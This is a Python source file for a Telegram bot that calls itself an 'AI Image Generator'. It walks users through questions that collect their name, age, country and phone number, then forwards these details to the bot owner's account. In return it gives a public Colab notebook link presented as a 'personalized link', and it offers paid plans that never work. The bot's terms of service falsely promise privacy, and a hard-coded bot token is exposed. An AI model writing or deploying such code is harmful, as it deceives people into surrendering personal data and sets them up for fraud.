from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ConversationHandler, CallbackQueryHandler, CallbackContext, filters
import asyncio

# Your BotFather token
BOT_TOKEN = "7546504066:AAFLAH7dwg4osow7e8G3D-FFcFJW89OHmm0"

# Your Telegram user ID
OWNER_ID = 5115865793

# Conversation states
ASK_NAME, ASK_AGE, ASK_REASON, ASK_COUNTRY, CONFIRM_DETAILS, SHOW_TOS, ASK_PHONE = range(7)

# Dictionary to store user data
user_data = {}

async def start(update: Update, context: CallbackContext) -> int:
    """Welcome the user and start asking for information."""
    await update.message.reply_text(
        "🎉 Welcome to the AI Image Generator Bot! 🎉\n\n"
        "Before we begin, I'd love to get to know you a bit better.\n"
        "Let's start with your name. What's your name?"
    )
    return ASK_NAME

async def ask_age(update: Update, context: CallbackContext) -> int:
    """Ask the user's age."""
    context.user_data['name'] = update.message.text
    await update.message.reply_text(
        f"Nice to meet you, {context.user_data['name']}! How old are you?"
    )
    return ASK_AGE

async def ask_reason(update: Update, context: CallbackContext) -> int:
    """Ask the user why they are using the bot."""
    context.user_data['age'] = update.message.text
    await update.message.reply_text(
        "Got it! Now, can you tell me why you're interested in using this bot? "
        "For example, do you want to create images for fun, work, or something else?"
    )
    return ASK_REASON

async def ask_country(update: Update, context: CallbackContext) -> int:
    """Ask the user for their country."""
    context.user_data['reason'] = update.message.text
    await update.message.reply_text(
        "Great! Could you also tell me which country you're from?"
    )
    return ASK_COUNTRY

async def confirm_details(update: Update, context: CallbackContext) -> int:
    """Confirm the user's details."""
    context.user_data['country'] = update.message.text
    details = (
        f"📋 Here's the information you provided:\n\n"
        f"Name: {context.user_data['name']}\n"
        f"Age: {context.user_data['age']}\n"
        f"Reason for using the bot: {context.user_data['reason']}\n"
        f"Country: {context.user_data['country']}\n\n"
        "Is this correct? (yes/no)"
    )
    message = await update.message.reply_text(details)
    context.user_data['confirm_message_id'] = message.message_id
    return CONFIRM_DETAILS

async def show_tos(update: Update, context: CallbackContext) -> int:
    """Send Terms of Service (TOS) and show the 'I Agree' button."""
    if update.message.text.lower() in ["yes", "y"]:
        # Delete the confirmation message
        await context.bot.delete_message(
            chat_id=update.message.chat_id,
            message_id=context.user_data['confirm_message_id']
        )
        await update.message.delete()

        tos = (
    "📜 *Terms of Service (TOS):*\n\n"
    "1. The AI Image Generator may occasionally require maintenance, during which access may be temporarily unavailable. We aim to provide advanced notice when possible.\n\n"
    "2. All content generated by the AI Image Generator must adhere to community guidelines. Content should not include explicit, offensive, harmful, or misleading material. Users are solely responsible for the content they create.\n\n"
    "3. By using this bot, you agree to interact respectfully and responsibly. Any inappropriate behavior or misuse may result in a permanent ban.\n\n"
    "4. This bot is intended for educational and creative purposes only. Misuse for harmful, illegal, or unethical activities is strictly prohibited and will result in immediate termination of access.\n\n"
    "5. You must be at least 18 years old to use this bot. If you are under 18, parental consent is required. Continued use implies that you meet this criterion.\n\n"
    "6. Your personal data, including your phone number and any information you provide, will only be used for verification and personalization purposes. We do not sell, share, or misuse your data in any form.\n\n"
    "7. Your phone number is required for identity verification. This ensures that every user has personalized access to the AI Image Generator and its features. It will remain private and secure.\n\n"
    "8. AI-generated content is not guaranteed to be 100% accurate or realistic. Users are encouraged to critically evaluate the output before using it for any purpose.\n\n"
    "9. Pro Plan provides users with basic access to secure and reliable AI image generation tools. This is ideal for casual users who need standard features.\n\n"
    "10. Ultima Plan provides premium access with faster processing and advanced tools, ideal for professional use or users requiring high performance.\n\n"
    "11. Any abuse of the bot, including but not limited to spamming, exploiting system vulnerabilities, or intentionally misleading others, may lead to immediate suspension and reporting to appropriate authorities.\n\n"
    "12. This bot's owner is not liable for any misuse of generated content. Users are solely responsible for ensuring compliance with applicable laws and ethical guidelines.\n\n"
    "13. By agreeing to these terms, you understand and accept that updates to the bot, its features, and this agreement may occur periodically without prior notice.\n\n"
    "14. Your continued use of the bot implies consent to these terms. If you disagree with any terms, please discontinue using the bot immediately.\n\n"
    "15. We are committed to enhancing user experience. Feedback and suggestions are always welcome via our official communication channels.\n\n"
    "Please click 'I Agree' to proceed."
)
        # Add an "I Agree" button
        reply_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("I Agree", callback_data="agree_tos")]
        ])
        tos_message = await update.message.reply_text(tos, reply_markup=reply_markup)
        context.user_data['tos_message_id'] = tos_message.message_id
        return SHOW_TOS
    else:
        await update.message.reply_text(
            "No problem! Let's start again. Type /start to restart the process."
        )
        return ConversationHandler.END

async def handle_tos_agreement(update: Update, context: CallbackContext) -> int:
    """Handle the user's agreement to the TOS."""
    query = update.callback_query
    await query.answer()

    # Delete the TOS message
    await context.bot.delete_message(
        chat_id=query.message.chat_id,
        message_id=context.user_data['tos_message_id']
    )

    # Display "Please wait..." message
    wait_message = await query.message.reply_text("Please wait...")
    await asyncio.sleep(5)  # Wait for 5 seconds

    # Delete the "Please wait..." message
    await wait_message.delete()

    # Ask for the phone number
    explanation_message = await query.message.reply_text(
        "🔒 *Why do we ask for your phone number?*\n"
        "Your phone number is required for verification purposes and to create a personalized link to the AI Image Generator website. "
        "It will remain private and secure."
    )
    context.user_data['explanation_message_id'] = explanation_message.message_id

    # Create a button to request phone number
    contact_button = KeyboardButton("📲 Share My Phone Number", request_contact=True)
    reply_markup = ReplyKeyboardMarkup([[contact_button]], resize_keyboard=True)

    await query.message.reply_text(
        "Tap the button below to share your phone number:",
        reply_markup=reply_markup
    )
    return ASK_PHONE

async def handle_contact(update: Update, context: CallbackContext) -> int:
    """Handle the shared contact (phone number)."""
    contact = update.message.contact
    if contact:
        user_id = update.effective_user.id
        phone_number = contact.phone_number
        user_data[user_id] = {
            "name": context.user_data['name'],
            "age": context.user_data['age'],
            "reason": context.user_data['reason'],
            "country": context.user_data['country'],
            "phone_number": phone_number
        }

        # Delete the contact message and the explanation message
        await context.bot.delete_message(
            chat_id=update.message.chat_id,
            message_id=context.user_data['explanation_message_id']
        )
        await update.message.delete()

        # Send the personalized link with a tutorial button and "Subscription" button
        link = "https://colab.research.google.com/github/lllyasviel/Fooocus/blob/main/fooocus_colab.ipynb"
        reply_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("📖 Tutorial", callback_data="tutorial")],
            [InlineKeyboardButton("Subscription", callback_data="subscription")]
        ])
        await update.message.reply_text(
            f"✅ Thank you, {context.user_data['name']}! Your phone number has been verified.\n\n"
            f"🌐 Here is your personalized link to the AI Image Generator:\n{link}\n\n"
            "Use this link to start creating amazing AI-generated images!",
            reply_markup=reply_markup
        )

        # Notify the bot owner
        await context.bot.send_message(
            chat_id=OWNER_ID,
            text=f"📞 New user details:\n"
                 f"Name: {context.user_data['name']}\n"
                 f"Age: {context.user_data['age']}\n"
                 f"Reason: {context.user_data['reason']}\n"
                 f"Country: {context.user_data['country']}\n"
                 f"Phone Number: {phone_number}\n"
                 f"User ID: {user_id}"
        )
    return ConversationHandler.END

async def send_tutorial(update: Update, context: CallbackContext) -> None:
    """Send a tutorial with images step by step."""
    query = update.callback_query
    await query.answer()

    # Tutorial Steps
    steps = [
        ("/data/data/com.termux/files/home/bot_images/step4.jpg",
         "Step 1: If you're using Google Chrome or already signed in to your Google account, you may not see this step. Otherwise, sign in to proceed."),
        ("/data/data/com.termux/files/home/bot_images/step1.jpg",
         "Step 2: Click 'Run anyway' to proceed."),
        ("/data/data/com.termux/files/home/bot_images/step2.jpg",
         "Step 3: Wait for about 5 minutes for the process to complete."),
        ("/data/data/com.termux/files/home/bot_images/step3.jpg",
         "Step 4: Click the generated link to start creating amazing images!")
    ]

    # Send tutorial steps in order
    for path, caption in steps:
        with open(path, "rb") as image:
            await query.message.reply_photo(photo=image, caption=caption)

async def handle_subscription(update: Update, context: CallbackContext) -> None:
    """Handle the 'Subscription' button."""
    query = update.callback_query
    await query.answer()

    # Show subscription plans
    reply_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("Pro Plan", callback_data="pro_plan")],
        [InlineKeyboardButton("Ultima Plan", callback_data="ultima_plan")]
    ])
    subscription_message = await query.message.reply_text(
        "💎 *Subscription Plans:*\n\n"
        "🔹 *Pro Plan*:\n   - 1 month: $4.99\n   - 1 year: $29.99\n\n"
        "🔹 *Ultima Plan*:\n   - 1 month: $9.99\n   - 1 year: $49.99\n\n"
        "Pro Plan: Secure access to basic features.\n"
        "Ultima Plan: Faster access and advanced features.\n\n"
        "Select your plan below:",
        reply_markup=reply_markup
    )
    context.user_data['subscription_message_id'] = subscription_message.message_id

async def handle_plan_selection(update: Update, context: CallbackContext) -> None:
    """Handle plan selection."""
    query = update.callback_query
    await query.answer()

    # Delete the subscription message
    await context.bot.delete_message(
        chat_id=query.message.chat_id,
        message_id=context.user_data['subscription_message_id']
    )

    # Send "Under maintenance" message and delete it after 5 seconds
    maintenance_message = await query.message.reply_text(
        "⚠️ The subscription service is currently under maintenance due to an attack. Please try again later."
    )
    await asyncio.sleep(5)
    await maintenance_message.delete()

async def cancel(update: Update, context: CallbackContext) -> int:
    """Cancel the conversation."""
    await update.message.reply_text(
        "Conversation canceled. If you want to try again, type /start."
    )
    return ConversationHandler.END

def main():
    # Initialize the Application
    application = Application.builder().token(BOT_TOKEN).build()

    # Conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_age)],
            ASK_AGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_reason)],
            ASK_REASON: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_country)],
            ASK_COUNTRY: [MessageHandler(filters.TEXT & ~filters.COMMAND, confirm_details)],
            CONFIRM_DETAILS: [MessageHandler(filters.TEXT & ~filters.COMMAND, show_tos)],
            SHOW_TOS: [CallbackQueryHandler(handle_tos_agreement, pattern="agree_tos")],
            ASK_PHONE: [MessageHandler(filters.CONTACT, handle_contact)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    # Add the conversation handler and callback query handlers
    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(send_tutorial, pattern="^tutorial$"))
    application.add_handler(CallbackQueryHandler(handle_subscription, pattern="^subscription$"))
    application.add_handler(CallbackQueryHandler(handle_plan_selection, pattern="^(pro_plan|ultima_plan)$"))

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()
    